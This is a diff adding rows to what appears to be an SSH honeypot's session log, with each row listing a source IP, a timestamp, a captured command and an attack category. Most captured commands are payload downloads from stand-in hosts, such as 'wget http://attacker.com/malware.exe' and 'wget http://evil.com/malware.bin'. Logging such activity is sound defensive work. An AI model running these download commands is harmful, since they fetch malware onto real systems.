@@ -15,3 +15,15 @@ S-1762627149,127.0.0.1,50178,2025-11-09 00:09:10,wget http://malicious.example/x
 S-1762776952,127.0.0.1,61024,2025-11-10 17:45:55,wget http://malicious.example/x | 🔴 CMD: ls -la,2222,default,recon,LOCAL
 S-1762797098,127.0.0.1,57713,2025-11-10 23:21:41,wget http://malicious.example/x | 🔴 CMD: ls -la,2222,default,recon,LOCAL
 S-1762797430,127.0.0.1,55184,2025-11-10 23:27:12,wget http://malicious.example/x | 🔴 CMD: ls -la,2222,default,recon,LOCAL
+S-1767861160,127.0.0.1,54971,2026-01-08 14:02:41,wget http://malicious.example/x | 🔴 CMD: ls -la,2222,default,recon,LOCAL
+S-1767939702,203.0.113.42,54321,2026-01-09 06:21:42,SSH-2.0-OpenSSH_7.4 | root@192.168.1.1 | wget http://evil.com/malware.bin,2222,honeypot-primary,apt,UNKNOWN
+S-1767940127,127.0.0.1,64330,2026-01-09 11:58:47,Connection events only,2222,default,unknown,LOCAL
+S-1767940128,127.0.0.1,64331,2026-01-09 11:58:48,wget http://attacker.com/malware.exe,2222,default,recon,LOCAL
+S-1767942088,127.0.0.1,62544,2026-01-09 12:31:28,Connection events only,2222,default,unknown,LOCAL
+S-1767942089,127.0.0.1,50287,2026-01-09 12:31:29,wget http://attacker.com/malware.exe,2222,default,recon,LOCAL
+S-1768121800,127.0.0.1,54028,2026-01-11 14:26:41,wget http://attacker.com/malware.exe,2222,default,recon,LOCAL
+S-1768932661,127.0.0.1,65251,2026-01-20 23:41:02,wget http://attacker.com/malware.exe,2222,default,recon,LOCAL
+S-1768932878,127.0.0.1,51072,2026-01-20 23:44:38,Connection events only,2222,default,unknown,LOCAL
+S-1768932879,127.0.0.1,51073,2026-01-20 23:44:39,wget http://attacker.com/malware.exe,2222,default,recon,LOCAL
+S-1768933303,127.0.0.1,58044,2026-01-20 23:51:44,wget http://attacker.com/malware.exe,2222,default,recon,LOCAL
+S-1768933348,127.0.0.1,60691,2026-01-20 23:52:29,wget http://attacker.com/malware.exe,2222,default,recon,LOCAL
